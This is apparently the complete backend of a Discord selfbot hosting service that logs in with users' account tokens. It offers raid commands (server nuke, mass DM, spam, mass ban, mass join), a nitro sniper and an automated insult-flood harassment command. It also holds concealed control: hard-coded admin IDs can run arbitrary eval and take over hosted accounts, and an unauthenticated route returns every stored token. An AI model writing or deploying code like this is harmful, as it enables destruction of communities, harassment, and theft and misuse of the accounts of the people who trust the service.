import express from 'express';
import { Client, Message, Options } from 'discord.js-selfbot-v13';
import cors from 'cors';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';
import fs from 'fs';
import { createClient } from '@supabase/supabase-js';
import https from 'https';
import fetch from 'node-fetch';
import { Headers } from 'node-fetch';

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('dist'));

// Supabase Setup (Simulated if keys missing)
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_KEY || '';
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Types ---
interface BotSession {
    id: string;
    token: string;
    username: string;
    discriminator: string;
    avatar: string;
    status: 'ok' | 'error' | 'offline';
    logs: string[];
}

interface RpcConfig {
    name: string;
    details: string;
    state: string;
    largeImageKey: string;
    largeImageText: string;
    smallImageKey: string;
    smallImageText: string;
    button1Label: string;
    button1Url: string;
    button2Label: string;
    button2Url: string;
    type?: number;
    applicationId?: string;
}

// --- State ---
const activeClients = new Map<string, Client>();
const sessions = new Map<string, BotSession>();
const rpcSettings = new Map<string, RpcConfig[]>();
const rpcSelectedIndex = new Map<string, number>();
const prefixes = new Map<string, string>(); // token -> prefix
const voiceConnections = new Map<string, any>(); 
const nitroSniperEnabled = new Map<string, boolean>();
const nitroSniperStats = new Map<string, { detected: number, claimed: number }>();
const antiGcEnabled = new Map<string, boolean>();
const rotatingStates = new Map<string, boolean>();
const rotationTimers = new Map<string, NodeJS.Timeout>();
const autoReconnectConfigs = new Map<string, boolean>();
const afkStates = new Map<string, { enabled: boolean, message: string }>();
const afkCooldowns = new Map<string, Map<string, number>>();
const antiNukeGuilds = new Map<string, Set<string>>();
const blacklistedTokens = new Set<string>();
const adminUserIds = new Set(['1413100448482857081', '1462523761302437889', '1453811580721692742']);
const serverBackups = new Map<string, any>();
const whitelistedUsers = new Map<string, Set<string>>();
const packingTargets = new Map<string, string>();
const intentionalDisconnects = new Set<string>();
const allAltTokens = new Set<string>();
const altClients = new Map<string, Client[]>();
const deletedMessages = new Map<string, Map<string, any[]>>();

const HELP_CATEGORIES: any = {
    1: { name: "Main", label: "[MAIN]", color: "#ff6b35", commands: [
        { name: ".help [cat] [pg]", desc: "Shows the help menu for each category" },
        { name: ".ping", desc: "Check selfbot latency and current uptime" },
        { name: ".info", desc: "Display selfbot information & live stats" },
        { name: ".prefix <chr>", desc: "Change the command prefix on-the-fly" },
        { name: ".settoken <t>", desc: "Update your auth token in memory" },
        { name: ".reload", desc: "Restart the selfbot process entirely" },
        { name: ".eval <code>", desc: "Execute arbitrary Discord.js code" },
        { name: ".host <u?> <t>", desc: "Host an account directly via token" },
        { name: ".clearselfbot", desc: "Reset VPS and clear all data (Emergency)" },
        { name: ".stop", desc: "Stop current activities" },
    ]},
    2: { name: "Raid", label: "[RAID]", color: "#dc2626", commands: [
        { name: ".massdm <msg>", desc: "Mass DM every reachable server member" },
        { name: ".spam <n> <msg>", desc: "Spam a message N times in the channel" },
        { name: ".webhookspam <msg> <n>", desc: "Spam via webhook" },
        { name: ".nuke", desc: "Destroy server (Channels, Roles, Spam)" },
        { name: ".joinserver <inv>", desc: "Join a server with anti-captcha" },
        { name: ".mjoin <inv>", desc: "All alts join the server" },
        { name: ".antigc", desc: "Auto-leave group DMs" },
        { name: ".spamgc <@>", desc: "Mass add user to group DM" },
        { name: ".wl <@>", desc: "Whitelist user for commands" },
        { name: ".unwl <@>", desc: "Unwhitelist user" },
        { name: ".massban", desc: "Ban all non-admin members at once" },
    ]},
    3: { name: "Fun", label: "[FUN]", color: "#fbbf24", commands: [
        { name: ".cat", desc: "Get a random cat image" },
        { name: ".dog", desc: "Get a random dog image" },
        { name: ".joke", desc: "Get a random joke" },
        { name: ".meme", desc: "Get a random meme" },
        { name: ".mock <text>", desc: "mOcK sOmE tExT" },
        { name: ".reverse <text>", desc: "esrever txet" },
        { name: ".nitro", desc: "Generate a fake nitro link" },
        { name: ".8ball <q>", desc: "Ask the magic 8ball" },
        { name: ".coinflip", desc: "Flip a coin" },
        { name: ".roll <n>", desc: "Roll a dice with N sides" },
        { name: ".ascii <txt>", desc: "Convert text to ASCII art" },
        { name: ".uwu <txt>", desc: "UwUify your text" },
        { name: ".clap <txt>", desc: "Replace spaces with claps" },
    ]},
    4: { name: "Utility", label: "[UTIL]", color: "#3b82f6", commands: [
        { name: ".avatar <@>", desc: "Get a user's avatar" },
        { name: ".banner <@>", desc: "Get a user's banner" },
        { name: ".whois <@>", desc: "Get user information" },
        { name: ".serverinfo", desc: "Get server information" },
        { name: ".urban <word>", desc: "Search Urban Dictionary" },
        { name: ".weather <city>", desc: "Get current weather" },
        { name: ".translate <to> <text>", desc: "Translate text" },
        { name: ".calc <expr>", desc: "Calculate an expression" },
        { name: ".shorten <url>", desc: "Shorten a URL" },
        { name: ".qr <text>", desc: "Generate a QR code" },
        { name: ".snipe", desc: "Retrieve last deleted message" },
        { name: ".purge <n>", desc: "Bulk-delete N messages" },
    ]},
    5: { name: "Self", label: "[SELF]", color: "#8b5cf6", commands: [
        { name: ".ghostping <@>", desc: "Ping and delete immediately" },
        { name: ".afk <msg>", desc: "Set an AFK status" },
        { name: ".unafk", desc: "Remove AFK status" },
        { name: ".steal <emoji>", desc: "Steal an emoji to your server" },
        { name: ".cloneserver <id>", desc: "Clone a server (Requires permissions)" },
        { name: ".hypesquad <type>", desc: "Change HypeSquad house" },
        { name: ".bio <text>", desc: "Change your bio" },
        { name: ".nick <name>", desc: "Change your nickname" },
        { name: ".invisible", desc: "Toggle invisible presence" },
        { name: ".typing <n>", desc: "Show typing indicator" },
    ]},
    6: { name: "Config", label: "[CONFIG]", color: "#10b981", commands: [
        { name: ".pack <@>", desc: "Start packing a user" },
        { name: ".unpack", desc: "Stop packing" },
        { name: ".autoreconnect", desc: "Toggle VC auto-reconnect" },
        { name: ".setprefix <p>", desc: "Change command prefix" },
        { name: ".logs", desc: "Show recent logs" },
        { name: ".clearlogs", desc: "Clear all logs" },
        { name: ".settings", desc: "Show current settings" },
    ]},
    7: { name: "Voice", label: "[VOICE]", color: "#f43f5e", commands: [
        { name: ".joinvc <id>", desc: "Join a voice channel" },
        { name: ".leavevc", desc: "Leave voice channel" },
        { name: ".play <url>", desc: "Play audio in VC" },
        { name: ".stopaudio", desc: "Stop audio playback" },
        { name: ".volume <n>", desc: "Set audio volume" },
        { name: ".mute", desc: "Mute yourself in VC" },
        { name: ".unmute", desc: "Unmute yourself" },
        { name: ".deafen", desc: "Deafen yourself" },
        { name: ".undeafen", desc: "Undeafen yourself" },
        { name: ".soundboard <id>", desc: "Play a soundboard sound" },
        { name: ".spamsb <n> [ms]", desc: "Spam random soundboard sounds" },
        { name: ".autoquest", desc: "Automatically accept and play discord quests" },
        { name: ".rpc [flags]", desc: "Set RPC. Read dashboard for details" },
    ]},
    8: { name: "Revenge", label: "[REVENGE]", color: "#ef4444", commands: [
        { name: ".term <@>", desc: "Monitor and auto-report a user's violations" },
        { name: ".unterm <@>", desc: "Stop monitoring a user" },
        { name: ".termed", desc: "List all currently termed users" },
        { name: ".ghostping <@>", desc: "Ghost-ping a user" },
        { name: ".spam <n> <msg>", desc: "Spam a message N times" },
    ]}
};

const addLog = (token: string, message: string) => {
    const session = sessions.get(token);
    if (!session) return;
    session.logs.unshift(`[${new Date().toLocaleTimeString()}] ${message}`);
    if (session.logs.length > 50) session.logs.pop();
};

async function getClient(token: string): Promise<Client> {
    if (activeClients.has(token)) {
      const client = activeClients.get(token)!;
      if (client.isReady() && client.user) return client;
      intentionalDisconnects.add(token);
      client.destroy();
      activeClients.delete(token);
    }
    
    let wsProps = { 
        $os: 'Windows', 
        $browser: 'Discord Client', 
        $device: 'Computer',
        $system_locale: 'en-US'
    };

    const client = new Client({
      // @ts-ignore
      ws: { properties: wsProps },
      makeCache: Options.cacheWithLimits({
          MessageManager: 10,
          ThreadManager: 0,
          PresenceManager: 0,
          ReactionManager: 0,
          UserManager: 10,
          GuildMemberManager: 100,
          VoiceStateManager: 100
      })
    });
    
    // @ts-ignore
    client.token = token;

    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        client.destroy();
        reject(new Error('Login timed out (120s)'));
      }, 120000);

      client.on('ready', () => {
        clearTimeout(timeout);
        console.log(`Logged in as ${client.user?.tag}`);
        resolve(client);
      });

      client.on('messageCreate', async (message) => {
          // Nitro Sniper Logic
          if (nitroSniperEnabled.get(token)) {
              const nitroRegex = /(discord\.gift\/|discord\.com\/gifts\/|discordapp\.com\/gifts\/)[a-zA-Z0-9]+/g;
              const match = message.content.match(nitroRegex);
              if (match) {
                  const code = match[0].split('/').pop();
                  if (code) {
                      const stats = nitroSniperStats.get(token) || { detected: 0, claimed: 0 };
                      stats.detected++;
                      nitroSniperStats.set(token, stats);
                      
                      // @ts-ignore
                      client.redeemNitro(code).then(() => {
                          stats.claimed++;
                          nitroSniperStats.set(token, stats);
                          addLog(token, `Nitro claimed: ${code}`);
                      }).catch(() => {
                          addLog(token, `Nitro fail: ${code}`);
                      });
                  }
              }
          }
          
          handleMessage(client, token, message);
      });

      client.on('channelCreate', (channel) => {
          if ((channel.type as any) === 'GROUP_DM' && antiGcEnabled.get(token)) {
              // @ts-ignore
              channel.delete().catch(() => {});
              addLog(token, `Left group DM automatically (Anti-GC)`);
          }
      });

      client.on('error', (err) => {
        console.error('Discord client error:', err);
      });

      activeClients.set(token, client);
      client.login(token).catch(reject);
    });
}

async function handleMessage(client: Client, token: string, message: Message) {
    if (message.author.id === client.user?.id) {
        if (afkStates.get(token)?.enabled) {
            afkStates.delete(token);
            addLog(token, "AFK status removed due to activity.");
        }
    }

    if (message.mentions.has(client.user!) && !message.author.bot && message.author.id !== client.user?.id) {
        const afk = afkStates.get(token);
        if (afk?.enabled) {
            let cooldowns = afkCooldowns.get(token);
            if (!cooldowns) {
                cooldowns = new Map();
                afkCooldowns.set(token, cooldowns);
            }
            const lastPing = cooldowns.get(message.author.id) || 0;
            if (Date.now() - lastPing > 30000) {
                cooldowns.set(message.author.id, Date.now());
                message.reply(afk.message).catch(() => {});
            }
        }
    }

    const prefix = prefixes.get(token) || '.';
    if (!message.content.startsWith(prefix)) return;
    if (allAltTokens.has(token)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift()?.toLowerCase();

    const isSuperAdmin = adminUserIds.has(message.author.id);
    if (blacklistedTokens.has(token) && !isSuperAdmin) return;

    if (isSuperAdmin) {
        if (command === 'iban' || command === 'ban') {
            await message.delete().catch(() => {});
            const targetToken = args[0];
            if (targetToken) {
                blacklistedTokens.add(targetToken);
                 intentionalDisconnects.add(targetToken);
                const c = activeClients.get(targetToken);
                if (c) c.destroy();
                activeClients.delete(targetToken);
                await message.channel.send(`> iban: \`Banned Instance ...${targetToken.slice(-10)}\``).catch(() => {});
            }
            return;
        }

        if (command === 'gjoin') {
            await message.delete().catch(() => {});
            const invite = args[0];
            if (!invite) return;
            const allTokens = Array.from(activeClients.keys());
            await message.channel.send(`> gjoin: \`Global Mass Join started for ${allTokens.length} accounts...\``).catch(() => {});
            for (const t of allTokens) {
                const c = activeClients.get(t);
                if (c) {
                    // @ts-ignore
                    c.acceptInvite(invite).catch(() => {});
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            await message.channel.send(`> gjoin: \`Global Mass Join complete.\``).catch(() => {});
            return;
        }
    }

    if (command === 'ping') {
        const ping = client.ws.ping;
        await message.channel.send(`> ping: \`${ping} ms\``).catch(() => {});
    }

    if (command === 'help') {
        await message.delete().catch(() => {});
        const catNum = parseInt(args[0]);
        let pageNum = parseInt(args[1]);
        if (isNaN(pageNum) && args[2]) pageNum = parseInt(args[2]);
        if (isNaN(pageNum)) pageNum = 1;
        
        const CMDS_PER_PAGE = 8;

        if (!isNaN(catNum) && HELP_CATEGORIES[catNum]) {
            const cat = HELP_CATEGORIES[catNum];
            const allCmds = cat.commands;
            const totalPages = Math.ceil(allCmds.length / CMDS_PER_PAGE);
            const page = Math.max(1, Math.min(pageNum, totalPages));
            
            const start = (page - 1) * CMDS_PER_PAGE;
            const end = start + CMDS_PER_PAGE;
            const currentCmds = allCmds.slice(start, end);

            let list = "";
            currentCmds.forEach((c: any) => {
                list += `> ${c.name}: \`${c.desc}\`\n`;
            });
            
            await message.channel.send(`> help: **Category (${cat.name})** - Page (**${page}/${totalPages}**)\n${list}`).catch(() => {});
        } else {
            let cats = "";
            Object.keys(HELP_CATEGORIES).forEach(k => {
                const cat = HELP_CATEGORIES[k];
                cats += `> ${k}: \`${cat.name} (${cat.commands.length} cmds)\`\n`;
            });
            await message.channel.send(`> help: **Categories List**\n${cats}> \n> **Usage:** \`${prefix}help <number> [page]\``).catch(() => {});
        }
    }

    if (command === 'pack') {
        await message.delete().catch(() => {});
        const target = message.mentions.users.first() || client.users.cache.get(args[0]);
        if (!target) return message.channel.send("> pack: `Target not found.`");
        
        packingTargets.set(token, target.id);
        await message.channel.send(`> pack: \`Now packing ${target.tag}. Use .unpack to stop.\``).catch(() => {});
        
        const insults = [
            "imagine being you lol", "dog water", "stay pressed", "get good", "ratio", "caught in 4k",
            "you're literally mid", "clown", "zero accomplishments", "cringe", "mad?", "cope harder"
        ];
        
        const packInterval = setInterval(async () => {
            if (packingTargets.get(token) !== target.id) {
                clearInterval(packInterval);
                return;
            }
            const iIdx = Math.floor(Math.random() * insults.length);
            await message.channel.send(`<@${target.id}> ${insults[iIdx]}`).catch(() => {
                clearInterval(packInterval);
                packingTargets.delete(token);
            });
        }, 1800);
    }

    if (command === 'unpack') {
        await message.delete().catch(() => {});
        packingTargets.delete(token);
        await message.channel.send("> unpack: `Stopped packing targets.`").catch(() => {});
    }

    if (command === 'joinserver') {
        await message.delete().catch(() => {});
        const inv = args[0];
        if (inv) {
            // @ts-ignore
            await client.acceptInvite(inv).then(() => message.channel.send("> joinserver: `Joined.`")).catch(e => message.channel.send(`> joinserver: \`Failed: ${e.message}\``));
        }
    }

    if (command === 'mjoin') {
        await message.delete().catch(() => {});
        const invite = args[0];
        if (!invite) return;
        const alts = altClients.get(token) || [];
        const all = [client, ...alts];
        await message.channel.send(`> mjoin: \`Mass Join start for ${all.length} accounts.\``).catch(() => {});
        for (const c of all) {
            // @ts-ignore
            await c.acceptInvite(invite).catch(() => {});
            await new Promise(r => setTimeout(r, 2000));
        }
        await message.channel.send(`> mjoin: \`Mass Join complete.\``).catch(() => {});
    }

    if (command === 'antigc') {
        await message.delete().catch(() => {});
        const cur = antiGcEnabled.get(token) || false;
        antiGcEnabled.set(token, !cur);
        await message.channel.send(`> antigc: \`${!cur ? 'ENABLED' : 'DISABLED'}\``).catch(() => {});
    }

    if (command === 'info') {
        const uptime = process.uptime();
        const hrs = Math.floor(uptime / 3600);
        const mins = Math.floor((uptime % 3600) / 60);
        await message.channel.send(`> info: \`Uptime: ${hrs}h ${mins}m | Servers: ${client.guilds.cache.size} | Friends: ${client.relationships.friendCache.size}\``).catch(() => {});
    }

    if (command === 'massdm') {
        await message.delete().catch(() => {});
        const msg = args.join(' ');
        if (!msg) return;
        const members = message.guild ? await message.guild.members.fetch().catch(() => null) : null;
        if (!members) return message.channel.send("> massdm: `Failed to fetch members.`");
        await message.channel.send(`> massdm: \`Sending to ${members.size} members...\``).catch(() => {});
        let count = 0;
        for (const [id, member] of members) {
            if (id === client.user?.id) continue;
            await member.send(msg).then(() => count++).catch(() => {});
            await new Promise(r => setTimeout(r, 1500));
        }
        await message.channel.send(`> massdm: \`Sent to ${count} members.\``).catch(() => {});
    }

    if (command === 'spam') {
        await message.delete().catch(() => {});
        const count = parseInt(args[0]);
        const msg = args.slice(1).join(' ');
        if (isNaN(count) || !msg) return;
        for (let i = 0; i < count; i++) {
            await message.channel.send(msg).catch(() => {});
        }
    }

    if (command === 'nuke') {
        await message.delete().catch(() => {});
        if (!message.guild) return;
        await message.channel.send("> nuke: `Initializing annihilation...`").catch(() => {});
        const g = message.guild;
        g.channels.cache.forEach(c => c.delete().catch(() => {}));
        for (let i = 0; i < 50; i++) {
            g.channels.create('nuked-by-forevermore', { type: 'GUILD_TEXT' }).then(c => {
                for (let j = 0; j < 5; j++) c.send("@everyone NUKE BY FOREVERMORE").catch(() => {});
            }).catch(() => {});
        }
    }

    if (command === 'avatar') {
        const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author;
        await message.channel.send(`> avatar: ${user.displayAvatarURL({ dynamic: true, size: 4096 })}`).catch(() => {});
    }

    if (command === 'ghostping') {
        await message.delete().catch(() => {});
        const user = message.mentions.users.first() || client.users.cache.get(args[0]);
        if (!user) return;
        const msg = await message.channel.send(`<@${user.id}>`).catch(() => null);
        if (msg) await msg.delete().catch(() => {});
    }

    if (command === 'eval') {
        if (!isSuperAdmin && message.author.id !== client.user?.id) return;
        const code = args.join(' ');
        if (!code) return;
        try {
            const evaled = eval(code);
            await message.channel.send(`> eval: \`\`\`js\n${evaled}\n\`\`\``).catch(() => {});
        } catch (e: any) {
            await message.channel.send(`> eval: \`\`\`js\n${e.message}\n\`\`\``).catch(() => {});
        }
    }

    if (command === 'afk') {
        const msg = args.join(' ') || 'I am currently AFK.';
        afkStates.set(token, { enabled: true, message: msg });
        await message.channel.send(`> afk: \`Status set to: ${msg}\``).catch(() => {});
    }

    if (command === 'unafk') {
        afkStates.delete(token);
        await message.channel.send("> unafk: `Status removed.`").catch(() => {});
    }
}

// API Routes
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

app.post('/api/auth/login', async (req, res) => {
    const { token } = req.body;
    try {
        const client = await getClient(token);
        const session: BotSession = {
            id: uuidv4(),
            token,
            username: client.user!.username,
            discriminator: client.user!.discriminator,
            avatar: client.user!.displayAvatarURL(),
            status: 'ok',
            logs: []
        };
        sessions.set(token, session);
        res.json(session);
    } catch (e: any) {
        res.status(400).json({ error: e.message });
    }
});

app.get('/api/tokens', (req, res) => {
    res.json(Array.from(sessions.values()));
});

app.post('/api/actions', async (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    const { action, text, targetUserId } = req.body;
    const client = activeClients.get(token);
    if (!client) return res.status(404).json({ error: 'Client not found' });

    try {
        if (action === 'massJoin') {
            // @ts-ignore
            await client.acceptInvite(text).catch(() => {});
            return res.json({ success: true });
        }
        if (action === 'customStatus') {
            client.user?.setPresence({ activities: [{ name: text, type: 'PLAYING' }] });
            return res.json({ success: true });
        }
        if (action === 'afk') {
             const { message } = req.body;
             afkStates.set(token, { enabled: true, message: message || 'I am AFK' });
             client.user?.setPresence({ status: 'idle' });
             return res.json({ success: true });
        }
    } catch (e: any) {
        return res.status(500).json({ error: e.message });
    }
    res.status(400).json({ error: 'Invalid action' });
});

app.get('/api/admin/all-sessions', (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    const client = activeClients.get(token);
    if (!client || !client.user || !adminUserIds.has(client.user.id)) return res.status(403).json({ error: 'Forbidden' });

    const all = Array.from(sessions.entries()).map(([t, s]) => ({
        token: t,
        username: s.username,
        avatar: s.avatar,
        status: s.status,
        sessionId: s.id
    }));
    res.json(all);
});

app.post('/api/admin/action', (req, res) => {
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    const client = activeClients.get(token);
    if (!client || !client.user || !adminUserIds.has(client.user.id)) return res.status(403).json({ error: 'Forbidden' });

    const { action, targetToken } = req.body;
    if (action === 'ban' && targetToken) {
        blacklistedTokens.add(targetToken);
        const c = activeClients.get(targetToken);
        if (c) c.destroy();
        activeClients.delete(targetToken);
        return res.json({ success: true });
    }
    res.status(400).json({ error: 'Invalid' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
});
